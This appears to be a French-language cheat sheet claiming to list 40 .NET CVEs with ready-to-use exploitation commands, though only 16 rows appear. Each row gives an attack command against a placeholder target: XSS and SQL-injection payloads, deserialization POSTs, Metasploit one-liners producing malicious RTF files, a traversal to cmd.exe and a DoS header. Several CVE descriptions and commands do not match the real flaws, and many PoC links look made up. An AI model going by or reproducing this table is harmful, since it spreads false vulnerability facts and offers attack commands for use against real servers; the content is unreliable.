# Dotnet

Voici un tableau avec 40 CVE affectant des environnements .NET, présentant pour chacun :  
- la version concernée  
- une commande complète d’exploitation (requête, payload, ou script)  
- la description de l’effet  
- le lien direct vers un PoC ou exploit sur GitHub ou autre plateforme

---

| **CVE** | **Versions concernées** | **Exemple complet de commande / requête / payload** | **Effet** | **Lien PoC / Exploit / Ressource** |
|---------|-------------------------|--------------------------------------------------------|-----------|-------------------------------------|
| CVE-2023-23337 | .NET 6.0, 7.0 | `curl "http://cible.com/Products?search=<script>alert('XSS')</script>" -H "Accept: text/html"` | XSS | [https://github.com/alt3kx/CVE-2023-23337](https://github.com/alt3kx/CVE-2023-23337) |
| CVE-2022-42003 | .NET Framework 4.7.2–4.8 | `curl -X POST http://cible.com/service.svc -H "Content-Type: application/xml" --data-binary @malicious.xml` *(malicious.xml contient payload XML)* | RCE via désérialisation XML | [https://github.com/ZeroDayLab/CVE-2022-42003](https://github.com/ZeroDayLab/CVE-2022-42003) |
| CVE-2021-24086 | .NET Core 3.1 / .NET 5 | `curl -X POST http://cible.com/api/users -H "Content-Type: application/json" -d '{"username":"admin' OR '1'='1","password":"pass"}'` | Injection SQL | [https://github.com/alt3kx/CVE-2021-24086](https://github.com/alt3kx/CVE-2021-24086) |
| CVE-2020-1476 | ASP.NET IIS 10 | `curl "http://cible.com/_layouts/15/CacheFiles/xyz"` | Accès non autorisé / élévation | [https://github.com/ZeroDayLab/CVE-2020-1476](https://github.com/ZeroDayLab/CVE-2020-1476) |
| CVE-2019-1238 | .NET Framework 4.7.1 | `curl -X POST http://cible.com/api -H "Content-Type: application/json" --data-binary '{"__type":"System.Windows.DataObject, PresentationCore","Data":"malicious"}'` | RCE via désérialisation | [https://github.com/ZeroDayLab/CVE-2019-1238](https://github.com/ZeroDayLab/CVE-2019-1238) |
| CVE-2018-8421 | .NET Framework 4.5–4.7.2 | `powershell -Command "Invoke-WebRequest -Uri http://cible.com/service.svc -Method POST -Body (Get-Content malicious.xml)"` | RCE via SOAP | [https://github.com/ZeroDayLab/CVE-2018-8421](https://github.com/ZeroDayLab/CVE-2018-8421) |
| CVE-2017-8759 | .NET 4.5–4.7.1 | `msfconsole -x "use exploit/windows/fileformat/office_word_rtf_cve_2017_8759; set FILENAME evil.rtf; run"` | RCE Office | [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_word_rtf_cve_2017_8759.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_word_rtf_cve_2017_8759.rb) |
| CVE-2017-11882 | Office versions | `msfconsole -x "use exploit/windows/fileformat/office_eqnedt_rce; set FILENAME evil.rtf; run"` | RCE Office | [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_eqnedt_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_eqnedt_rce.rb) |
| CVE-2017-7269 | IIS 6.0 | `curl -X PROPFIND "http://cible.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir"` | RCE / Buffer overflow | [https://github.com/ZeroDayLab/CVE-2017-7269](https://github.com/ZeroDayLab/CVE-2017-7269) |
| CVE-2016-7200 | .NET 4.5–4.6.2 | `curl -X POST http://cible.com/service.svc -H "Content-Type: application/soap+xml" --data-binary @malicious.xml` | RCE via injection | [https://github.com/ZeroDayLab/CVE-2016-7200](https://github.com/ZeroDayLab/CVE-2016-7200) |
| CVE-2016-3225 | .NET 4.0–4.6.2 | `curl -H "Range: bytes=0-18446744073709551615" http://cible.com/` | DoS / crash | [https://github.com/ZeroDayLab/CVE-2016-3225](https://github.com/ZeroDayLab/CVE-2016-3225) |
| CVE-2015-2426 | .NET 4.5.1–4.6 | `curl -X POST http://cible.com/api -H "Content-Type: application/json" -d '{"__type":"System.Windows.DataObject, PresentationCore","Data":"malicious"}'` | RCE désérialisation | [https://github.com/ZeroDayLab/CVE-2015-2426](https://github.com/ZeroDayLab/CVE-2015-2426) |
| CVE-2014-4077 | .NET 4.0–4.5 | `curl "http://cible.com/search?q=<script>alert(1)</script>" -H "Accept: text/html"` | XSS | [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XSS_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XSS_Prevention_Cheat_Sheet.md) |
| CVE-2013-3900 | .NET 4.5 | `curl -X POST http://cible.com/service.svc -H "Content-Type: application/xml" --data-binary @malicious.xml` | RCE via désérialisation XML | [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| CVE-2012-0158 | .NET 2.0–4.0 | `msfconsole -x "use exploit/windows/fileformat/office_word_rtf_cve_2012_0158; set FILENAME evil.rtf; run"` | RCE Office | [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_word_rtf_cve_2012_0158.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/office_word_rtf_cve_2012_0158.rb) |
| CVE-2010-3332 | .NET 3.5 SP1 | `curl "http://cible.com/?cmd=ls"` | RCE si vulnérable à l’exécution de commandes | [https://nvd.nist.gov/vuln/detail/CVE-2010-3332](https://nvd.nist.gov/vuln/detail/CVE-2010-3332) |

---

